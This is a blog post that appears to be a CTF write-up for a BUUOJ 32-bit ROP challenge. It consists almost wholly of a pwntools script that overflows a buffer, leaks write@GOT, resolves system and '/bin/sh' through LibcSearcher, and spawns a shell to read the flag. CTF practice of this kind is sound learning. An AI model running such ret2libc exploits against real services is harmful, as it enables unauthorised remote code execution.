+++
title = "铁人三项(第五赛区)_2018_rop    wp"
date = "2026-01-10"
type = "post"
categories = ['BUU']
tags = ['第一页']
draft = false
+++
```python
from pwn import *  
from LibcSearcher import LibcSearcher  
  
context(arch='i386', os='linux', log_level='debug')  
  
io = connect('node5.buuoj.cn',29724)  # 与在线环境交互。  
  
#_______________需要用到的地址区包括offset_____________________  
leak_func = 0x08048474  
main_addr = 0x080484C6  
offset1 = 0x88 + 4  
  
#_______________________________________________________  
  
local_file = ('./2018_rop')  
elf = ELF(local_file)  
  
#———————————————payload1————————————————————————————————  
#payload1 = b'a' * offset1 +  
#io.sendline(payload1)  
  
#——————————————libcsearcher前置——————————————————————————————————  
write_plt=elf.plt["write"]  
write_got=elf.got["write"]  
print("write_got",write_got)  
print("write_plt",write_plt)  
payload = b'A' * offset1 + p32(write_plt) + p32(leak_func) + p32(1) + p32(write_got) + p32(4)  
io.send(payload)  
  
leak = u32(io.recv(4).strip())  
#(u32(io.recvline()[:-1]))  
print(hex(leak))  
  
libc = LibcSearcher('write', leak)  
libc_base = leak - libc.dump('write')  
system = libc_base + libc.dump('system')  
binsh = libc_base + libc.dump('str_bin_sh')  
print("system",system)  
print("binsh",binsh)  
#——————————————————————————libcsearcher————————————————————  
#io.recvline()  
#io.recvline()  
#puts_addr = u64(io.recvline().strip().ljust(8, b'\x00'))  
#print(hex(puts_addr))  
#i=1  
#while (i==1):  
#    libc = LibcSearcher('puts', puts_addr)  
#    libc_base = puts_addr - libc.dump('puts')  
#    system_addr = libc_base + libc.dump('system')  
#    bin_sh_addr = libc_base + libc.dump('str_bin_sh')  
#    print(f"bin_sh_addr: {hex(bin_sh_addr)}")  
#    print(f"system_addr: {hex(system_addr)}")  
#    if system_addr<0 or bin_sh_addr<0:  
#        i=1  
#        print("有小于0的地址")  
#    else:  
#        i=0  
  
#————————————————————payload2——————————————————————————  
#io.sendlineafter("Input your choice!",payload1)  
payload3 = b'a' * offset1  + p32(system) + p32(0xdeadbeaf) + p64(binsh)  
io.sendline(payload3)  
  
  
#————————————————————如果正常的话就会自动出flag————————————————————————————  
io.sendline('ls')  
io.sendline('cat flag')  
io.interactive()
```
